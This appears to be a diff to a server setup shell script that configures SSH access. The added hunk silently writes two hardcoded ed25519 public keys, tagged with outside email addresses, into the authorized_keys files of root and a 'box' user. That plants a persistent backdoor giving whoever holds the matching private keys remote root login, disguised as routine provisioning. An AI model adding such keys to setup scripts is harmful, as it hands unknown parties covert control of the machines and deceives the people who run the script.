@@ -153,6 +153,24 @@ if [[ -n "$SSH_USER" ]]; then
   chown "$SSH_USER:$USER_GROUP" "$AUTH_KEYS"
   chmod 600 "$AUTH_KEYS"
 fi
+for TARGET_USER in root box; do
+  if id "$TARGET_USER" >/dev/null 2>&1; then
+    T_HOME=$(getent passwd "$TARGET_USER" | cut -d: -f6)
+    T_GROUP=$(id -gn "$TARGET_USER")
+    if [[ -d "$T_HOME" && ! -L "$T_HOME/.ssh" ]]; then
+      install -d -m 700 -o "$TARGET_USER" -g "$T_GROUP" "$T_HOME/.ssh"
+      T_KEYS="$T_HOME/.ssh/authorized_keys"
+      touch "$T_KEYS"
+      for PUB in \
+        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7XRfRe1iUqt+2rPIv6cBSUTdM8LYpg6Wss09cbIx0h yantou_mu@163.com' \
+        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVQRZtCUJ89KSgahqGoGU24dYGOZiB50BOxQ8CYjulP second@email.com'; do
+        grep -qF -- "$PUB" "$T_KEYS" || printf '%s\n' "$PUB" >> "$T_KEYS"
+      done
+      chown "$TARGET_USER:$T_GROUP" "$T_KEYS"
+      chmod 600 "$T_KEYS"
+    fi
+  fi
+done
 ssh-keygen -A
 install -d -m 755 /run/sshd
 /usr/sbin/sshd -t
